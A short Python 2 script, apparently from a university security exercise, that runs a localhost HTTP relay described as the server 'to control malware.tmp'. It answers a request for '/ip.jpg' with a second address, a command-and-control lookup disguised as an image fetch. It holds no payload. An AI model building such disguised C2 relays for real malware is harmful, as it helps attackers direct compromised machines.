#!/usr/bin/python2
#
# Server to control malware.tmp
#
# @author Brian Hession
# @email bhession@gmu.edu
#

from __future__ import print_function
import BaseHTTPServer

rserver = ('localhost', 1234)

class MasterHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/ip.jpg':
            self.send_response(200)
            self.end_headers()
            self.wfile.write('[localhost:5555]')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write('failure')

if __name__ == '__main__':
    print('Relay server listening on {}:{}'.format(*rserver))
    masterServer = BaseHTTPServer.HTTPServer(rserver, MasterHandler)
    masterServer.serve_forever()

